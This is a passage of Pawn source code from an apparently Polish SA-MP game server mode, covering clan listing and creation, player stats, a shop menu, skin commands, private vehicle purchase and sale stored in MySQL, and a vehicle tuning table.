			if(gColor[ganggid] == 4) {
				if(osia == 0) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d)\n", s, ganggid, BLUE >>> 8, gName[ganggid], gScore[ganggid]);
				else format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d) {FFFF00}(Odznaczenia: %d)"C_WHITE"\n", s, ganggid, BLUE >>> 8, gName[ganggid], gScore[ganggid], osia); }
			if(gColor[ganggid] == 5) {
				if(osia == 0) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d)\n", s, ganggid, ORANGE >>> 8, gName[ganggid], gScore[ganggid]);
				else format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d) {FFFF00}(Odznaczenia: %d)"C_WHITE"\n", s, ganggid, ORANGE >>> 8, gName[ganggid], gScore[ganggid], osia); }
			if(gColor[ganggid] == 6) {
				if(osia == 0) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d)\n", s, ganggid, MAGENTA >>> 8, gName[ganggid], gScore[ganggid]);
				else format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d) {FFFF00}(Odznaczenia: %d)"C_WHITE"\n", s, ganggid, MAGENTA >>> 8, gName[ganggid], gScore[ganggid], osia); }
			if(gColor[ganggid] == 7) {
				if(osia == 0) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d)\n", s, ganggid, AQUA >>> 8, gName[ganggid], gScore[ganggid]);
				else format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d) {FFFF00}(Odznaczenia: %d)"C_WHITE"\n", s, ganggid, AQUA >>> 8, gName[ganggid], gScore[ganggid], osia); }
			if(gColor[ganggid] == 8) {
				if(osia == 0) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d)\n", s, ganggid, GOLD >>> 8, gName[ganggid], gScore[ganggid]);
				else format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d) {FFFF00}(Odznaczenia: %d)"C_WHITE"\n", s, ganggid, GOLD >>> 8, gName[ganggid], gScore[ganggid], osia); }
			if(gColor[ganggid] == 9) {
				if(osia == 0) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d)\n", s, ganggid, SEAGREEN >>> 8, gName[ganggid], gScore[ganggid]);
				else format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d) {FFFF00}(Odznaczenia: %d)"C_WHITE"\n", s, ganggid, SEAGREEN >>> 8, gName[ganggid], gScore[ganggid], osia); }
			if(gColor[ganggid] == 10) {
				if(osia == 0) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d)\n", s, ganggid, OLIVE >>> 8, gName[ganggid], gScore[ganggid]);
				else format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d) {FFFF00}(Odznaczenia: %d)"C_WHITE"\n", s, ganggid, OLIVE >>> 8, gName[ganggid], gScore[ganggid], osia); }
			if(gColor[ganggid] == 11) {
				if(osia == 0) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d)\n", s, ganggid, SPRINGGREEN >>> 8, gName[ganggid], gScore[ganggid]);
				else format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d) {FFFF00}(Odznaczenia: %d)"C_WHITE"\n", s, ganggid, SPRINGGREEN >>> 8, gName[ganggid], gScore[ganggid], osia); }
			if(gColor[ganggid] == 12) {
				if(osia == 0) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d)\n", s, ganggid, MAROON >>> 8, gName[ganggid], gScore[ganggid]);
				else format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d) {FFFF00}(Odznaczenia: %d)"C_WHITE"\n", s, ganggid, MAROON >>> 8, gName[ganggid], gScore[ganggid], osia); }
			if(gColor[ganggid] == 13) {
				if(osia == 0) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d)\n", s, ganggid, LIME >>> 8, gName[ganggid], gScore[ganggid]);
				else format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d) {FFFF00}(Odznaczenia: %d)"C_WHITE"\n", s, ganggid, LIME >>> 8, gName[ganggid], gScore[ganggid], osia); }
			if(gColor[ganggid] == 14) {
				if(osia == 0) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d)\n", s, ganggid, MEDIUMAQUA >>> 8, gName[ganggid], gScore[ganggid]);
				else format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d) {FFFF00}(Odznaczenia: %d)"C_WHITE"\n", s, ganggid, MEDIUMAQUA >>> 8, gName[ganggid], gScore[ganggid], osia); }
			mysql_free_result();
		}
	}
	if(Player[playerid][Gang] == -1) format(s, sizeof(s), "%s"C_YELLOW"Nie posiadasz klanu? Za³ó¿ swój za pomoc¹ komendy "C_WHITE"/cc"C_YELLOW"!", s);
	return ShowPlayerDialog(playerid, DIALOG_KLANY, DIALOG_STYLE_LIST, ""C_WHITE"Klany", s, "Wybierz", "Zamknij");
}

CMD:cccancel(playerid, params[])
{
	if(!ClanStrefa[playerid]) return SendClientMessage(playerid, RED, "Aktualnie nie tworzysz klanu.");
	ClanColor[playerid] = -1;
 	ClanStrefa[playerid] = false;
  	ClanPatriot[playerid] = false;
   	ClanPunkty[playerid] = 0;
    SendClientMessage(playerid, RED, "Anulowano proces tworzenia klanu. Klan nie zosta³ stworzony.");
    return 1;
}

CMD:cc(playerid, params[]) {
	if(gangs >= MAX_GANGS) return SendClientMessage(playerid, RED, "Zosta³ osi¹gniêty limit klanów.");
	if(Player[playerid][Gang] > -1) return SendClientMessage(playerid, RED, "Jesteœ ju¿ w jakimœ klanie.");
	if(Player[playerid][Exp] < 20000) return DialogError(playerid, "{FFFF00}Do za³o¿enia klanu wymagane jest "C_WHITE"20000 EXP{FFFF00}.\nPostaraj siê znaleŸæ osoby, z którymi za³o¿ysz klan i pomog¹ Ci zbieraæ EXP.");
	return ShowPlayerDialog(playerid, DIALOG_KLANNAME, DIALOG_STYLE_INPUT, ""C_BLUE1"Tworzenie klanu", ""C_WHITE"Witaj w kreatorze tworzenia klanu.\nPamiêtaj, ¿e za³o¿enie klanu kosztuje "C_RED"20000 "C_WHITE"EXP.\n\nZacznijmy od wybrania nazwy dla Twojego klanu.\nPoni¿ej wprowadŸ nazwê dla Twojego klanu.", "Dalej", "Zamknij"); }

CMD:stats(playerid, params[]) {
	new s[2048];
	format(s, sizeof(s), ""C_WHITE"Po³¹czeñ z serwerem: "C_BLUE1"%d\n"C_WHITE"Dzisiejszy rekord graczy: "C_BLUE1"%d\n"C_WHITE"Rekord graczy: "C_BLUE1"%d\n"C_WHITE"Wyrzuconych graczy: "C_BLUE1"%d\n"C_WHITE"Nadanych banów: "C_BLUE1"%d\n"C_WHITE"Rozdanych itemów: "C_BLUE1"%d\n"C_WHITE"Z³apanych potworów: "C_BLUE1"%d", connects, daily, record, kicks, bans, eq, pokemons);
	return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""NAZWA"", s, "Zamknij", ""); }

CMD:autor(playerid, params[]) return Autorzy(playerid);
CMD:sklep(playerid, params[]) return ShowPlayerDialog(playerid, DIALOG_SKLEP, DIALOG_STYLE_LIST, ""C_BLUE1"Sklep", ""C_YELLOW"» Do³adowanie portfela\n"C_WHITE"VIP - 30 dni (10 z³)\nVIP - 90 dni (25 z³)\nVIP - 365 dni (50 z³)\nEXP - 5000 (7 z³)\nEXP - 20000 (21 z³)\nEXP - 50000 (50 z³)\nEXP - 100000 (90 z³)", "Wybierz", "Zamknij");

CMD:language(playerid, params[]) return cmd_lang(playerid, params);
CMD:lang(playerid, params[])
{
	if(ENMode[playerid]) {
	    ENMode[playerid] = false;
	    SendClientMessageEx(playerid, -1, ""PLUS""C_LOLIVE"Zmieniono jêzyk na "C_WHITE"Polski"C_LOLIVE".", ""PLUS""C_LOLIVE"Language changed to "C_WHITE"Polish"C_LOLIVE"."); }
	else {
	    ENMode[playerid] = true;
	    SendClientMessageEx(playerid, -1, ""PLUS""C_LOLIVE"Zmieniono jêzyk na "C_WHITE"Angielski"C_LOLIVE".", ""PLUS""C_LOLIVE"Language changed to "C_WHITE"English"C_LOLIVE"."); }
	SendClientMessageEx(playerid, RED, "Angielska wersja GM jest w trakcie rozwoju. Prosimy o cierpliwoœæ.", "English version of GM is during work. Please be patient.");
	return 1;
}

CMD:vmode(playerid, params[])
{
	if(TDOn[playerid]) {
	    TDOn[playerid] = false;
	    TextdrawForPlayer(playerid, false);
	}
	else {
	    TDOn[playerid] = true;
	    TextdrawForPlayer(playerid, true);
	}
	return 1;
}

TextdrawForPlayer(playerid, bool:wartosc)
{
	switch(wartosc)
	{
	    case true:
	    {
			Loop(td, 10) TextDrawShowForPlayer(playerid, Textdraw[td]);
			if(ServerEvent) {
			    TextDrawShowForPlayer(playerid, Textdraw[10]);
			    TextDrawShowForPlayer(playerid, Textdraw[11]); }
			if(ReflexActive) ShowReflex(playerid);
   			TextDrawShowForPlayer(playerid, Textdraw[16]);
   			TextDrawShowForPlayer(playerid, Textdraw[17]);
   			TextDrawShowForPlayer(playerid, Textdraw[18]);
   			if(TrwajaceNapady > 0) TextDrawShowForPlayer(playerid, Textdraw[19]);
			if(AutomatycznyStart) {
			    TextDrawShowForPlayer(playerid, Textdraw[20]);
			    TextDrawShowForPlayer(playerid, Textdraw[21]);
			    TextDrawShowForPlayer(playerid, Textdraw[22]); }
			if(EVStartuje) {
 				TextDrawShowForPlayer(playerid, Textdraw[23]);
				TextDrawShowForPlayer(playerid, Textdraw[24]);
				TextDrawShowForPlayer(playerid, Textdraw[25]); }
			if(ZnajdzkaActive) TextDrawShowForPlayer(playerid, Textdraw[27]);
			PlayerTextDrawShow(playerid, Nick[playerid]);
			PlayerTextDrawShow(playerid, ExpTD[playerid]);
			PlayerTextDrawShow(playerid, Grasz[playerid]);
			PlayerTextDrawShow(playerid, FPSTD[playerid]);
			PlayerTextDrawShow(playerid, PingTD[playerid]);
			PlayerTextDrawShow(playerid, LevelTD[playerid]);
			PlayerTextDrawShow(playerid, PortfelTD[playerid]);
			PlayerTextDrawShow(playerid, Kamizelka[playerid]);
			PlayerTextDrawShow(playerid, HPTD[playerid]);
			if(IsPlayerInAnyVehicle(playerid)) PlayerTextDrawShow(playerid, Licznik[playerid]);
		}
	    case false:
	    {
			Loop(td, 10) TextDrawHideForPlayer(playerid, Textdraw[td]);
			if(ServerEvent) {
			    TextDrawHideForPlayer(playerid, Textdraw[10]);
			    TextDrawHideForPlayer(playerid, Textdraw[11]); }
			if(ReflexActive) HideReflex(playerid);
   			TextDrawHideForPlayer(playerid, Textdraw[16]);
   			TextDrawHideForPlayer(playerid, Textdraw[17]);
   			TextDrawHideForPlayer(playerid, Textdraw[18]);
   			if(TrwajaceNapady > 0) TextDrawHideForPlayer(playerid, Textdraw[19]);
			if(AutomatycznyStart) {
			    TextDrawHideForPlayer(playerid, Textdraw[20]);
			    TextDrawHideForPlayer(playerid, Textdraw[21]);
			    TextDrawHideForPlayer(playerid, Textdraw[22]); }
			if(EVStartuje) {
 				TextDrawHideForPlayer(playerid, Textdraw[23]);
				TextDrawHideForPlayer(playerid, Textdraw[24]);
				TextDrawHideForPlayer(playerid, Textdraw[25]); }
			if(ZnajdzkaActive) TextDrawHideForPlayer(playerid, Textdraw[27]);
			PlayerTextDrawHide(playerid, Nick[playerid]);
			PlayerTextDrawHide(playerid, ExpTD[playerid]);
			PlayerTextDrawHide(playerid, Grasz[playerid]);
			PlayerTextDrawHide(playerid, FPSTD[playerid]);
			PlayerTextDrawHide(playerid, PingTD[playerid]);
			PlayerTextDrawHide(playerid, LevelTD[playerid]);
			PlayerTextDrawHide(playerid, PortfelTD[playerid]);
			PlayerTextDrawHide(playerid, Kamizelka[playerid]);
			PlayerTextDrawHide(playerid, HPTD[playerid]);
			if(IsPlayerInAnyVehicle(playerid)) PlayerTextDrawHide(playerid, Licznik[playerid]);
		}
	}
}

CMD:loadskin(playerid, params[])
{
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER || GetPlayerState(playerid) == PLAYER_STATE_PASSENGER) return DialogError(playerid, "{FFFF00}Przed zmian¹ skina opuœæ pojazd.");
	new sqlquery[1024], temploaded;
	m_query("SELECT skin FROM players WHERE id = %d", Player[playerid][ID]);
	mysql_store_result();
	mysql_fetch_row(sqlquery, " ");
	if(mysql_num_rows() > 0)
	{
		sscanf(sqlquery, "i", temploaded);
		if(temploaded == 0) return DialogError(playerid, "{FFFF00}Skin jest Ÿle zapisany lub jest nim CJ.");
	}
	else return DialogError(playerid, "{FFFF00}Wyst¹pi³ problem ze wczytaniem skina.");
	SetSpawnInfo(playerid, NO_TEAM, temploaded, 2121.8608,1001.0126,10.8203, 0.0, 0, 0, 0, 0, 0, 0);
	SetPlayerSkin(playerid, temploaded);
    Player[playerid][Skin] = temploaded;
	mysql_free_result();
	return 1;
}

CMD:skin(playerid, params[])
{
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER || GetPlayerState(playerid) == PLAYER_STATE_PASSENGER) return DialogError(playerid, "{FFFF00}Przed zmian¹ skina opuœæ pojazd.");
	new skin;
	if(sscanf(params, "i", skin))
		return SyntaxError(playerid, "{01FCFF}/skin [skinid]");
	if(skin < 0 || skin >= 310)
		return DialogError(playerid, "{FFFF00}Wpisano nieprawid³owy Skin ID!");

	SetPlayerSkin(playerid, skin);
	SetSpawnInfo(playerid, NO_TEAM, skin, 2121.8608,1001.0126,10.8203, 0.0, 0, 0, 0, 0, 0, 0);
    Player[playerid][Skin] = skin;
	return 1;
}

CMD:buy(playerid, params[])
{
	if(HavePrivcar[playerid]) return DialogError(playerid, "{FFFF00}Posiadasz ju¿ prywatny pojazd.");
	if(pOffer[playerid] == -1 || pOfferExp[playerid] == -1) return DialogError(playerid, "{FFFF00}Brak oferty kupna pojazdu.");
	if(Player[playerid][Exp] < pOfferExp[playerid]) return DialogError(playerid, "{FFFF00}Nie staæ Ciê na zaakceptowanie oferty.");
	new sellerid = pOffer[playerid];
	Loop(privcarid, privcars)
	{
		if(pOwner[privcarid] == Player[sellerid][ID])
		{
		    Player[playerid][Exp] -= pOfferExp[playerid];
	   		if(IsPlayerInVehicle(sellerid, ppVeh[sellerid])) RemovePlayerFromVehicle(sellerid);
  			HavePrivcar[sellerid] = false;
			pOwner[privcarid] = Player[playerid][ID];
			format(pOwnerN[privcarid], 20, "%s", Player[playerid][Name]);
			HavePrivcar[playerid] = true;
			new tdstr[256];
			if(pFuelT[privcarid] == 0) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(95, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
			if(pFuelT[privcarid] == 1) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(98, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
			if(pFuelT[privcarid] == 2) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(ON, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
			if(pFuelT[privcarid] == 3) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(LPG, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
			Update3DTextLabelText(pText[privcarid], -1, tdstr);
			SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Prywatny pojazd zakupiony!");
			PutPlayerInVehicle(playerid, ppVeh[privcarid], 0);
			SendClientMessage(sellerid, -1, ""PLUS""C_LOLIVE"Gracz zaakceptowa³ ofertê sprzeda¿y prywatnego pojazdu.");
			AddExp(Player[sellerid][Exp], pOfferExp[playerid]);
			pOffer[playerid] = -1;
			pOffer[sellerid] = -1;
			pOfferExp[sellerid] = -1;
			pOfferExp[playerid] = -1;
			m_query("UPDATE privcars SET ownername = '%s', ownerid = %d WHERE cid = %d", pOwnerN[privcarid], pOwner[privcarid], privcarid);
		}
	}
	return 1;
}

CMD:pojazd(playerid, params[]) return cmd_pv(playerid, params);
CMD:p(playerid, params[]) return cmd_pv(playerid, params);
CMD:pp(playerid, params[]) return cmd_pv(playerid, params);
CMD:privcar(playerid, params[]) return cmd_pv(playerid, params);
CMD:pv(playerid, params[]) 
{
	if(OnNonDM[playerid]) return DialogError(playerid, "{FFFF00}Zarz¹dzanie prywatnym pojazdem w tym miejscu jest niemo¿liwe.");
    if(!HavePrivcar[playerid])
    {
    	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) return DialogError(playerid, "{FFFF00}Aktualnie prowadzisz inny pojazd.");
		new Vehicle[32], VehicleID, Float:x, Float:y, Float:z, Float:pAngle, anim[2][32];
		if(Player[playerid][Exp] < 10000) return DialogError(playerid, "{FFFF00}Kupno pojazdu kosztuje "C_WHITE"10000 EXP{FFFF00}.");
    if(Player[playerid][CPick] < 8) {
        new czstr[256];
        format(czstr, sizeof(czstr), "{FFFF00}Na ten moment posiadasz "C_WHITE"%d/8 {FFFF00}czêœci do pojazdu.\n\nCzêœci te mo¿esz zebraæ szukaj¹c ich po mapie.", Player[playerid][CPick]);
		return DialogError(playerid, czstr); }
		if(privcars >= MAX_PRIVCARS) return DialogError(playerid, "{FFFF00}Osi¹gniêto limit prywatnych pojazdów.");
 		if(sscanf(params, "s[32]", Vehicle)) return SyntaxError(playerid, "{01FCFF}/pv [vehicle name/id]");
		GetAnimationName(GetPlayerAnimationIndex(playerid), anim[0], 32, anim[1], 32);
		if(!IsNumeric(Vehicle)) {
 			VehicleID = GetVehicleModelIDFromName(Vehicle);
			if(validModel(VehicleID) || Restricted(VehicleID)) return SendClientMessage(playerid, RED, "Nieprawid³owa nazwa pojazdu lub pojazd jest zabroniony."); }
		else {
	    	VehicleID = strval(Vehicle);
			if(validModel(VehicleID) || Restricted(VehicleID)) return SendClientMessage(playerid, RED, "Nieprawid³owe ID pojazdu."); }
		if(!strcmp(anim[0], "PARACHUTE") && anim[0][1]) return DialogError(playerid, "{FFFF00}Nie mo¿esz teraz przywo³aæ pojazdu.");
		if(GetPlayerInterior(playerid)) return DialogError(playerid, "{FFFF00}Nie mo¿esz przywo³aæ pojazdu w tym miejscu.");
		Player[playerid][Exp] -= 10000;
    Player[playerid][CPick] = 0;
		HavePrivcar[playerid] = true;
		GetPlayerPos(playerid, x, y, z);
		GetPlayerFacingAngle(playerid, pAngle);
		Loop(privcarid, privcars)
		{
		    new newpriv;
			m_query("SELECT * FROM privcars WHERE cid = %d", privcarid);
			mysql_store_result();
			if(mysql_num_rows() == 0)
			{
			    mysql_free_result();
				newpriv = privcars + 1;
				prX[newpriv] = x;
				prY[newpriv] = y;
				prZ[newpriv] = z;
				prA[newpriv] = pAngle;
				format(pOwnerN[newpriv], 20, "%s", Player[playerid][Name]);
				pOwner[newpriv] = Player[playerid][ID];
				pModel[newpriv] = VehicleID;
				pColor[newpriv][0] = random(200);
				pColor[newpriv][1] = random(200);
				pFuel[newpriv] = 50.0;
				pDist[newpriv] = 0.0;
				pNeon[newpriv] = -1;
				pPaint[newpriv] = 0;
				pFuelT[newpriv] = 0;
				new sql[256];
				format(sql, sizeof(sql), "INSERT INTO privcars (cid, ownername, ownerid, modelid, x, y, z, a, neontype, dist) VALUES (%d, '%s', %d, %d, %.3f, %.3f, %.3f, %.3f, %d, %.1f)", newpriv, Player[playerid][Name], Player[playerid][ID], VehicleID, x, y, z, pAngle, pNeon[newpriv], pDist[newpriv]);
				mysql_query(sql);
				ppVeh[newpriv] = CreateVehicle(pModel[newpriv], prX[newpriv], prY[newpriv], prZ[newpriv], prA[newpriv], pColor[newpriv][0], pColor[newpriv][1], -1, 0);
                SetPrivcarHandling(newpriv);
				PutPlayerInVehicle(playerid, ppVeh[newpriv], 0);
				OnMap[newpriv] = true;
				new tdstr[256];
				if(pFuelT[newpriv] == 0) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(95, U%d)\n"C_NICK"%.1fkm", pOwnerN[newpriv], newpriv, pFuel[newpriv], pUpgrade[newpriv], pDist[newpriv]);
				if(pFuelT[newpriv] == 1) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(98, U%d)\n"C_NICK"%.1fkm", pOwnerN[newpriv], newpriv, pFuel[newpriv], pUpgrade[newpriv], pDist[newpriv]);
				if(pFuelT[newpriv] == 2) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(ON, U%d)\n"C_NICK"%.1fkm", pOwnerN[newpriv], newpriv, pFuel[newpriv], pUpgrade[newpriv], pDist[newpriv]);
				if(pFuelT[newpriv] == 3) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(LPG, U%d)\n"C_NICK"%.1fkm", pOwnerN[newpriv], newpriv, pFuel[newpriv], pUpgrade[newpriv], pDist[newpriv]);
				pText[newpriv] = Create3DTextLabel(tdstr, WHITE, 0.0, 0.0, 0.0, 30.0, 0, 0);
				Attach3DTextLabelToVehicle(pText[newpriv], ppVeh[newpriv], 0.0, 0.0, 0.0);
				privcars++;
   				new playermodel = GetPlayerVehicleID(playerid);
				new modelid = GetVehicleModel(playermodel);
				new vistr[256];
				format(vistr, sizeof(vistr), "Kupi³eœ pojazd "C_WHITE"%s "C_GREEN"("C_WHITE"%d"C_GREEN"). Komendy pojazdu: "C_WHITE"/pv"C_GREEN".", GetVehicleName(playermodel), modelid);
				return SendClientMessage(playerid, GREEN, vistr);
			}

		}
		mysql_free_result();
		prX[privcars] = x;
		prY[privcars] = y;
		prZ[privcars] = z;
		prA[privcars] = pAngle;
		format(pOwnerN[privcars], 20, "%s", Player[playerid][Name]);
		pOwner[privcars] = Player[playerid][ID];
		pModel[privcars] = VehicleID;
		pColor[privcars][0] = random(200);
		pColor[privcars][1] = random(200);
		pFuel[privcars] = 50.0;
		pDist[privcars] = 0.0;
		pNeon[privcars] = -1;
		pPaint[privcars] = 0;
		pFuelT[privcars] = 0;
		new sql[256];
		format(sql, sizeof(sql), "INSERT INTO privcars (cid, ownername, ownerid, modelid, x, y, z, a, neontype, dist) VALUES (%d, '%s', %d, %d, %.3f, %.3f, %.3f, %.3f, %d, %.1f)", privcars, Player[playerid][Name], Player[playerid][ID], VehicleID, x, y, z, pAngle, pNeon[privcars], pDist[privcars]);
		mysql_query(sql);
		ppVeh[privcars] = CreateVehicle(pModel[privcars], prX[privcars], prY[privcars], prZ[privcars], prA[privcars], pColor[privcars][0], pColor[privcars][1], -1, 0);
		PutPlayerInVehicle(playerid, ppVeh[privcars], 0);
		OnMap[privcars] = true;
		new tdstr[256];
		if(pFuelT[privcars] == 0) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(95, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcars], privcars, pFuel[privcars], pUpgrade[privcars], pDist[privcars]);
		if(pFuelT[privcars] == 1) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(98, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcars], privcars, pFuel[privcars], pUpgrade[privcars], pDist[privcars]);
		if(pFuelT[privcars] == 2) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(ON, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcars], privcars, pFuel[privcars], pUpgrade[privcars], pDist[privcars]);
		if(pFuelT[privcars] == 3) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(LPG, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcars], privcars, pFuel[privcars], pUpgrade[privcars], pDist[privcars]);
		pText[privcars] = Create3DTextLabel(tdstr, WHITE, 0.0, 0.0, 0.0, 30.0, 0, 0);
		Attach3DTextLabelToVehicle(pText[privcars], ppVeh[privcars], 0.0, 0.0, 0.0);
		privcars++;
		new playermodel = GetPlayerVehicleID(playerid);
		new modelid = GetVehicleModel(playermodel);
		SaveAllData(playerid);
		new vistr[256], vistren[256];
		format(vistr, sizeof(vistr), "Kupi³eœ pojazd "C_WHITE"%s "C_GREEN"("C_WHITE"%d"C_GREEN"). Komendy pojazdu: "C_WHITE"/pv"C_GREEN".", GetVehicleName(playermodel), modelid);
		format(vistren, sizeof(vistren), "You bought "C_WHITE"%s "C_GREEN"("C_WHITE"%d"C_GREEN"). Vehicle panel: "C_WHITE"/pv"C_GREEN".", GetVehicleName(playermodel), modelid);
		return SendClientMessageEx(playerid, GREEN, vistr, vistren);
	}
	else
	{
	    new s[1024];
  		format(s, sizeof(s), ""C_WHITE"Teleportuj pojazd do siebie\n");
  		format(s, sizeof(s), "%s"C_WHITE"Teleportuj siê do pojazdu\n", s);
		format(s, sizeof(s), "%s"C_WHITE"Zmieñ kolory prywatnego pojazdu\n", s);
		format(s, sizeof(s), "%s"C_WHITE"Zmieñ model prywatnego pojazdu\t"C_YELLOW"(5000 EXP)\n", s);
		format(s, sizeof(s), "%s"C_WHITE"Ustaw neony w prywatnym pojeŸdzie\n", s);
		format(s, sizeof(s), "%s"C_WHITE"Zmieñ paliwo w prywatnym pojeŸdzie\n", s);
		format(s, sizeof(s), "%s"C_WHITE"Zaparkuj prywatny pojazd\n", s);
		format(s, sizeof(s), "%s"C_WHITE"Oddaj prywatny pojazd\n", s);
 		format(s, sizeof(s), "%s"C_WHITE"Z³ó¿ ofertê sprzeda¿y\n", s);
 		if(GetPrivcarHandling(playerid) == 1) format(s, sizeof(s), "%s"C_WHITE"Ulepszenie silnika", s);
		return ShowPlayerDialog(playerid, DIALOG_PRIVCAR, DIALOG_STYLE_LIST, "{CD82F5}Prywatny pojazd", s, "Wybierz", "Zamknij");
	}
}

tuneCar(vehicleid)
{
	switch(GetVehicleModel(vehicleid))
	{
		case 400: addVehicleComponent(vehicleid, 1010, 1013, 1018, 1019, 1020, 1021, 1024, 1086, 1087);
		case 401: addVehicleComponent(vehicleid, 1001, 1003, 1004, 1005, 1006, 1007, 1010, 1013, 1017, 1019, 1020, 1086, 1087, 1142, 1143, 1144, 1145);
		case 404: addVehicleComponent(vehicleid, 1000, 1002, 1007, 1010, 1013, 1016, 1017, 1019, 1020, 1021, 1086, 1087);
		case 405: addVehicleComponent(vehicleid, 1000, 1001, 1010, 1014, 1018, 1019, 1020, 1021, 1023, 1086, 1087);
		case 410: addVehicleComponent(vehicleid, 1001, 1003, 1007, 1010, 1013, 1017, 1019, 1020, 1021, 1023, 1024, 1086, 1087);
		case 415: addVehicleComponent(vehicleid, 1001, 1003, 1007, 1010, 1017, 1018, 1019, 1023, 1086, 1087);
		case 418: addVehicleComponent(vehicleid, 1002, 1006, 1010, 1016, 1020, 1021, 1086, 1087);
		case 420: addVehicleComponent(vehicleid, 1001, 1003, 1004, 1005, 1010, 1019, 1021, 1086, 1087);
		case 421: addVehicleComponent(vehicleid, 1000, 1010, 1014, 1016, 1018, 1019, 1020, 1021, 1023, 1086, 1087);
		case 422: addVehicleComponent(vehicleid, 1007, 1010, 1013, 1017, 1019, 1020, 1021, 1086, 1087);
		case 426: addVehicleComponent(vehicleid, 1001, 1003, 1004, 1005, 1006, 1010, 1019, 1021, 1086, 1087);
		case 436: addVehicleComponent(vehicleid, 1001, 1003, 1006, 1007, 1010, 1013, 1017, 1019, 1020, 1021, 1022, 1086, 1087);
		case 439: addVehicleComponent(vehicleid, 1001, 1003, 1007, 1010, 1013, 1017, 1023, 1086, 1087, 1142, 1143, 1144, 1145);
		case 477: addVehicleComponent(vehicleid, 1006, 1007, 1010, 1017, 1018, 1019, 1020, 1021, 1086, 1087);
		case 478: addVehicleComponent(vehicleid, 1004, 1005, 1010, 1012, 1013, 1020, 1021, 1022, 1024, 1086, 1087);
		case 489: addVehicleComponent(vehicleid, 1000, 1002, 1004, 1005, 1006, 1010, 1013, 1016, 1018, 1019, 1020, 1024, 1086, 1087);
		case 491: addVehicleComponent(vehicleid, 1003, 1007, 1010, 1014, 1017, 1018, 1019, 1020, 1021, 1023, 1086, 1087, 1142, 1143, 1144, 1145);
		case 492: addVehicleComponent(vehicleid, 1000, 1004, 1005, 1006, 1010, 1016, 1086, 1087);
		case 496: addVehicleComponent(vehicleid, 1001, 1002, 1003, 1006, 1007, 1010, 1011, 1017, 1019, 1020, 1023, 1086, 1087);
		case 500: addVehicleComponent(vehicleid, 1010, 1013, 1019, 1020, 1021, 1024, 1086, 1087);
